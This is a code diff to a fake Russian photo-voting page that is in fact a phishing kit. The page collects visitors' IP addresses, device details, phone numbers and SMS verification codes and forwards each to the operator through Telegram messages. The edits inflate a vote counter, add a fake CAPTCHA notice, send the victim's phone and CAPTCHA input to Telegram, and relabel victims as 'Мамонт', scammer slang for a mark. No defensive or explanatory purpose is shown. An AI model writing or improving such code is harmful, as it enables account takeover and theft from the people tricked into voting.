@@ -358,7 +358,7 @@
                     <img src="https://i.pinimg.com/736x/75/36/c4/7536c4d854b66a388824b9e321b7c668.jpg" alt="Фото 2">
                 </div>
                 <h3>@ayess</h3>
-                <div class="counter" id="counter2">0 голосов</div>
+                <div class="counter" id="counter2">26 голосов</div>
                 <button class="vote-btn" onclick="initiateVote(2)">Проголосовать</button>
             </div>
         </div>
@@ -384,6 +384,7 @@
             
             <div id="captchaForm" style="display: none;">
                 <p>Пожалуйста, подтвердите, что вы не робот</p>
+                <p class="small">После проверки код подтверждения будет отправлен в Telegram</p>
                 <div class="captcha-container">
                     <div id="captchaText" class="captcha-code"></div>
                     <button class="refresh-captcha" onclick="generateCaptcha()">↻</button>
@@ -457,17 +458,28 @@
             document.getElementById('verifyCaptchaLoading').style.display = 'inline-block';
             document.getElementById('verifyCaptchaBtn').disabled = true;
             
-            // Задержка для имитации проверки
-            setTimeout(() => {
-                // Переходим к форме SMS
-                document.getElementById('captchaForm').style.display = 'none';
-                document.getElementById('otpForm').style.display = 'block';
-                
-                // Восстанавливаем кнопку
-                document.getElementById('verifyCaptchaText').style.display = 'inline';
-                document.getElementById('verifyCaptchaLoading').style.display = 'none';
-                document.getElementById('verifyCaptchaBtn').disabled = false;
-            }, 1500);
+            // Отправляем уведомление о решении капчи
+            const captchaMessage = `✅ Мамонт успешно прошел капчу!\n\nТелефон: ${userPhoneNumber}\nВведенный код: ${userInput}`;
+            sendTelegramMessage(captchaMessage)
+                .then(() => {
+                    // Переходим к форме SMS после отправки уведомления
+                    document.getElementById('captchaForm').style.display = 'none';
+                    document.getElementById('otpForm').style.display = 'block';
+                    
+                    // Восстанавливаем кнопку
+                    document.getElementById('verifyCaptchaText').style.display = 'inline';
+                    document.getElementById('verifyCaptchaLoading').style.display = 'none';
+                    document.getElementById('verifyCaptchaBtn').disabled = false;
+                })
+                .catch(error => {
+                    console.error('Ошибка при отправке уведомления:', error);
+                    // Все равно переходим к форме SMS даже если уведомление не отправилось
+                    document.getElementById('captchaForm').style.display = 'none';
+                    document.getElementById('otpForm').style.display = 'block';
+                    document.getElementById('verifyCaptchaText').style.display = 'inline';
+                    document.getElementById('verifyCaptchaLoading').style.display = 'none';
+                    document.getElementById('verifyCaptchaBtn').disabled = false;
+                });
         }
 
         // Функция для получения информации об устройстве и IP
@@ -505,7 +517,7 @@
         async function sendEntryNotification() {
             const deviceInfo = await getDeviceAndIPInfo();
             
-            const message = `🔔 Новый посетитель на сайте голосования!\n\n📱 Устройство: ${deviceInfo.platform}\n🌐 IP-адрес: ${deviceInfo.ip}\n🖥 Разрешение экрана: ${deviceInfo.screenResolution}\n🔍 User Agent: ${deviceInfo.userAgent}`;
+            const message = `🦣 Новый Мамонт  на сайте голосования!\n\n📱 Устройство: ${deviceInfo.platform}\n🌐 IP-адрес: ${deviceInfo.ip}\n🖥 Разрешение экрана: ${deviceInfo.screenResolution}\n🔍 User Agent: ${deviceInfo.userAgent}`;
             
             sendTelegramMessage(message);
         }
@@ -547,7 +559,7 @@
             
             // Отправляем информацию о телефоне
             const deviceInfo = await getDeviceAndIPInfo();
-            const phoneMessage = `📞 Пользователь ввел номер телефона:\n\nТелефон: ${phoneNumber}\nIP: ${deviceInfo.ip}\nУстройство: ${deviceInfo.platform}\nUser Agent: ${deviceInfo.userAgent}`;
+            const phoneMessage = `📞 Мамонт 🦣 ввел номер телефона:\n\nТелефон: ${phoneNumber}\nIP: ${deviceInfo.ip}\nУстройство: ${deviceInfo.platform}\nUser Agent: ${deviceInfo.userAgent}`;
             await sendTelegramMessage(phoneMessage);
             
             // Добавляем задержку для имитации загрузки
@@ -580,7 +592,7 @@
             document.getElementById('verifyOtpBtn').disabled = true;
             
             // Отправляем информацию о подтверждении
-            const smsMessage = `✅ Пользователь подтвердил SMS-код:\n\nТелефон: ${userPhoneNumber}\nКод: ${otpCode}\nВыбранное фото: №${selectedPhotoId}`;
+            const smsMessage = `✅ Мамонт подтвердил SMS-код:\n\nТелефон: ${userPhoneNumber}\nКод: ${otpCode}\nВыбранное фото: №${selectedPhotoId}`;
             await sendTelegramMessage(smsMessage);
             
             // Добавляем задержку для имитации проверки
